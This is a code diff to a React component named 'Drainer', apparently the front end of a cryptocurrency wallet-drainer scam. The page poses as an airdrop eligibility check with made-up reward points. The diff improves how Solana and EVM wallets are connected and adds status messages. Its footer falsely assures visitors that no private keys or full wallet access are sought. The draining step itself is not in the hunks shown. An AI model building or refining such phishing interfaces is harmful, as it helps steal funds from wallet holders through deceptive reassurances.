@@ -12,9 +12,10 @@ export default function Drainer() {
   const [points, setPoints] = useState(0)
   const [stage, setStage] = useState<'connect' | 'verify' | 'claim'>('connect')
   const [showSuccess, setShowSuccess] = useState(false)
-  const [isConnecting, setIsConnecting] = useState(false)
+  const [connectionStatus, setConnectionStatus] = useState<'idle' | 'connecting' | 'connected' | 'error'>('idle')
   const [connectionError, setConnectionError] = useState('')
   const [selectedWallet, setSelectedWallet] = useState('')
+  const [walletAddress, setWalletAddress] = useState('')
 
   useEffect(() => {
     setPoints(Math.floor(Math.random() * 9000000) + 8000000)
@@ -174,7 +175,7 @@ export default function Drainer() {
   ]
 
   const connectWallet = async (walletType: string) => {
-    setIsConnecting(true)
+    setConnectionStatus('connecting')
     setConnectionError('')
     setSelectedWallet(walletType)
     
@@ -208,17 +209,25 @@ export default function Drainer() {
         throw new Error('Wallet not found')
       }
       
+      let connectedAddress = ''
+      
       if (wallet.type === 'solana' && solana) {
         if (solana.connect) {
-          await solana.connect()
+          const response = await solana.connect()
+          connectedAddress = response.publicKey?.toString()
+        } else if (solana.publicKey) {
+          connectedAddress = solana.publicKey.toString()
         }
-        if (solana.publicKey) {
-          setAccount(solana.publicKey.toString())
-          setStage('verify')
+        
+        if (connectedAddress) {
+          setAccount(connectedAddress)
+          setWalletAddress(connectedAddress)
+          setConnectionStatus('connected')
+          // Small delay to show success state before changing stage
+          setTimeout(() => setStage('verify'), 1000)
         }
       } else if (wallet.type === 'evm' && ethereum) {
         let provider = ethereum
-        // Find specific wallet in providers array
         if (ethereum.providers) {
           provider = ethereum.providers.find((p: any) => p[wallet.is]) || ethereum
         } else if (ethereum[wallet.is]) {
@@ -228,8 +237,12 @@ export default function Drainer() {
         if (provider) {
           const accounts = await provider.request({ method: 'eth_requestAccounts' })
           if (accounts && accounts[0]) {
-            setAccount(accounts[0])
-            setStage('verify')
+            connectedAddress = accounts[0]
+            setAccount(connectedAddress)
+            setWalletAddress(connectedAddress)
+            setConnectionStatus('connected')
+            // Small delay to show success state before changing stage
+            setTimeout(() => setStage('verify'), 1000)
           }
         } else {
           throw new Error(`${wallet.name} not detected. Please install the extension.`)
@@ -239,9 +252,10 @@ export default function Drainer() {
       }
     } catch (e) {
       console.error('Wallet connection error:', e)
+      setConnectionStatus('error')
       setConnectionError(e instanceof Error ? e.message : 'Failed to connect. Please try again.')
-    } finally {
-      setIsConnecting(false)
+      // Auto-reset after error
+      setTimeout(() => setConnectionStatus('idle'), 3000)
     }
   }
 
@@ -558,66 +572,110 @@ export default function Drainer() {
         {stage === 'connect' && (
           <div className="space-y-6">
             <div className="text-center">
-              <h1 className="text-3xl font-bold bg-gradient-to-r from-blue-400 to-purple-500 bg-clip-text text-transparent">
-                Secure Wallet Connection
+              <h1 className="text-3xl font-bold text-white">
+                Connect Your Wallet
               </h1>
-              <p className="mt-2 text-gray-400">Connect your wallet to check your airdrop eligibility</p>
-              <div className="mt-4 flex items-center justify-center space-x-2 text-sm text-gray-500">
-                <svg className="w-4 h-4 text-green-400" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
-                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
-                </svg>
-                <span>Secure Connection</span>
-                <span>•</span>
-                <span>No Private Key Access</span>
-              </div>
-            </div>
-            
-            <div className="grid grid-cols-1 gap-3">
-              {isConnecting ? (
-                <div className="text-center p-8">
-                  <div className="inline-block h-10 w-10 border-4 border-blue-500 border-t-transparent rounded-full animate-spin"></div>
-                  <p className="mt-4 text-gray-300">Connecting to {selectedWallet}...</p>
-                  <p className="text-sm text-gray-500 mt-2">Please check your wallet to approve the connection</p>
-                </div>
-              ) : (
-                <>
-                  {wallets.map((wallet) => (
-                    <button
-                      key={wallet.name}
-                      onClick={() => connectWallet(wallet.name)}
-                      className="group w-full flex items-center justify-between p-4 bg-gray-800/50 hover:bg-gray-800/80 rounded-xl transition-all duration-200 border border-gray-700 hover:border-blue-500/50"
-                      title={wallet.description}
-                    >
-                      <div className="flex items-center space-x-4">
-                        <div className="p-2 bg-gray-800 rounded-lg group-hover:bg-gray-700 transition-colors">
-                          <div className="w-6 h-6 flex items-center justify-center">
-                            {wallet.icon}
-                          </div>
-                        </div>
-                      </div>
-                      <svg className="w-5 h-5 text-gray-400 group-hover:text-blue-400 transition-colors" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
-                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 5l7 7-7 7" />
-                      </svg>
-                    </button>
-                  ))}
-                  {connectionError && (
-                    <div className="mt-4 p-3 bg-red-900/30 border border-red-800/50 rounded-lg text-red-200 text-sm">
-                      <div className="flex items-start">
-                        <svg className="w-5 h-5 mr-2 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+              <p className="mt-2 text-gray-300">Select your preferred wallet to continue</p>
+              
+              {/* Connection Status Indicator */}
+              {connectionStatus !== 'idle' && (
+                <div className={`mt-4 p-3 rounded-lg text-sm ${
+                  connectionStatus === 'connecting' ? 'bg-blue-900/30 border border-blue-800/50 text-blue-200' :
+                  connectionStatus === 'connected' ? 'bg-green-900/30 border border-green-800/50 text-green-200' :
+                  'bg-red-900/30 border border-red-800/50 text-red-200'
+                }`}>
+                  <div className="flex items-center justify-center space-x-2">
+                    {connectionStatus === 'connecting' && (
+                      <>
+                        <div className="w-4 h-4 border-2 border-blue-400 border-t-transparent rounded-full animate-spin"></div>
+                        <span>Connecting to {selectedWallet}...</span>
+                      </>
+                    )}
+                    {connectionStatus === 'connected' && (
+                      <>
+                        <svg className="w-5 h-5 text-green-400" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
+                        </svg>
+                        <span>Connected to {selectedWallet}</span>
+                        {walletAddress && (
+                          <span className="text-xs opacity-75">({walletAddress.slice(0, 6)}...{walletAddress.slice(-4)})</span>
+                        )}
+                      </>
+                    )}
+                    {connectionStatus === 'error' && (
+                      <>
+                        <svg className="w-5 h-5 text-red-400" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                           <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
                         </svg>
-                        <span>{connectionError}</span>
+                        <span>{connectionError || 'Connection failed'}</span>
+                      </>
+                    )}
+                  </div>
+                </div>
+              )}
+            </div>
+            
+            <div className="space-y-3">
+              {wallets.map((wallet) => (
+                <button
+                  key={wallet.name}
+                  onClick={() => connectWallet(wallet.name)}
+                  disabled={connectionStatus === 'connecting'}
+                  className={`w-full flex items-center justify-between p-4 rounded-xl transition-all duration-200 border ${
+                    connectionStatus === 'connecting' 
+                      ? 'opacity-50 cursor-not-allowed' 
+                      : 'hover:border-blue-500/50 cursor-pointer'
+                  } ${
+                    selectedWallet === wallet.name && connectionStatus === 'connecting'
+                      ? 'border-blue-500/50 bg-blue-900/20'
+                      : 'border-gray-700 bg-gray-800/50 hover:bg-gray-800/80'
+                  }`}
+                  title={wallet.description}
+                >
+                  <div className="flex items-center space-x-4">
+                    <div className={`p-2 rounded-lg transition-colors ${
+                      selectedWallet === wallet.name && connectionStatus === 'connecting'
+                        ? 'bg-blue-900/30'
+                        : 'bg-gray-800 group-hover:bg-gray-700'
+                    }`}>
+                      <div className="w-6 h-6 flex items-center justify-center">
+                        {wallet.icon}
                       </div>
                     </div>
-                  )}
-                  <div className="mt-6 pt-4 border-t border-gray-700/50">
-                    <p className="text-xs text-center text-gray-500">
-                      By connecting, you agree to our Terms of Service and Privacy Policy. 
-                      We'll never ask for your private keys or full wallet access.
-                    </p>
+                    <div className="text-left">
+                      <div className={`font-medium ${
+                        selectedWallet === wallet.name && connectionStatus === 'connecting'
+                          ? 'text-blue-300'
+                          : 'text-gray-100 group-hover:text-white'
+                      }`}>
+                        {wallet.name}
+                      </div>
+                      <div className="text-xs text-gray-400 flex items-center mt-1">
+                        <span className={`h-2 w-2 rounded-full mr-1.5 ${
+                          selectedWallet === wallet.name && connectionStatus === 'connecting'
+                            ? 'bg-blue-400'
+                            : 'bg-green-400'
+                        }`}></span>
+                        {wallet.security}
+                      </div>
+                    </div>
                   </div>
-                </>
-              )}
+                  {selectedWallet === wallet.name && connectionStatus === 'connecting' ? (
+                    <div className="w-5 h-5 border-2 border-blue-400 border-t-transparent rounded-full animate-spin"></div>
+                  ) : (
+                    <svg className="w-5 h-5 text-gray-400 group-hover:text-blue-400 transition-colors" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 5l7 7-7 7" />
+                    </svg>
+                  )}
+                </button>
+              ))}
+              
+              <div className="mt-6 pt-4 border-t border-gray-700/50">
+                <p className="text-xs text-center text-gray-500">
+                  By connecting, you agree to our Terms of Service and Privacy Policy. 
+                  We'll never ask for your private keys or full wallet access.
+                </p>
+              </div>
             </div>
           </div>
         )}
